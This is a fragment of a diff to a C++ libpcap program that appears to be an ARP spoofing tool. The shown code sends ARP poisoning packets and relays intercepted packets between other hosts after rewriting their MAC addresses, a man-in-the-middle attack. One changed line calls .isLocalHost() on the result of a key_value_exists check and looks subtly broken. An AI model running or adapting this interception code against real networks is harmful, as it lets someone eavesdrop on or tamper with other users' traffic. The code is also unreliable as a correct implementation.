@@ -274,7 +274,7 @@ int main(int argc, char* argv[]) {
 
 						for (auto it = lower; it != upper; ++it) {
 							if (it->second == target) {
-								printf("Update Arp Table %s -> %s\n", string(it->first).c_str(), string(it->second).c_str());
+								printf("Update Arp Table %s(Req) -> %s(Reply)\n", string(it->first).c_str(), string(it->second).c_str());
 								send_arp_attack_packet(handle, sender, target, myMac);
 								break;
 							}
@@ -290,15 +290,14 @@ int main(int argc, char* argv[]) {
 					
 					Ip sender = receivedPacketIp->ip_.src_ip(), target = receivedPacketIp->ip_.dst_ip();
 
-					if (!key_value_exists(senderTargetMap, sender, target)) break;
+					if (!key_value_exists(senderTargetMap, sender, target).isLocalHost()) break;
 					
 					printf("CatchPacket: %s -> %s\n", string(sender).c_str(), string(target).c_str());
 
 					receivedPacketIp->eth_.smac_ = myMac; 
 					receivedPacketIp->eth_.dmac_ = IpMacMap[target];
 					
-					int packetLen = receivedPacketIp->ip_.total_length_;
-
+					int packetLen = htons(receivedPacketIp->ip_.total_length_);
 					int res = pcap_sendpacket(handle, (const u_char*)receivedPacketIp, sizeof(EthHdr)+packetLen);
 					if (res) {
 						fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
